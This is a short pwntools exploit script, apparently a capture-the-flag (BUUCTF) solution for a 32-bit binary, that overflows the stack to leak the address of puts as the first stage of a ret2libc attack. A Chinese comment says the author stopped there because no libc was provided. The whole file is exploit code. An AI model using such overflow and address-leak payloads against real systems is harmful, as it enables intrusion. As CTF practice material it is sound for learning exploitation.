#Made by fly_autumn
#x86 ret2libc
from pwn import *
p = process("./pwn")
elf = ELF("./pwn")
context(os="linux",arch="i386")

payload = b"\x00" * 7 + b"\xff"
p.sendline(payload)

func_plt = 0x80487d0
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
offset = 0xe7+4
payload2 = offset*b"\x00" + p32(puts_plt) + p32(func_plt) + p32(puts_got)
p.recvuntil(b"Correct\n")
p.sendline(payload2)

puts_addr = u32(p.recv(4))
log.success("puts addr: "+hex(puts_addr))
#到这里就写不动了，因为BUUCTF没给libc......

p.interactive()
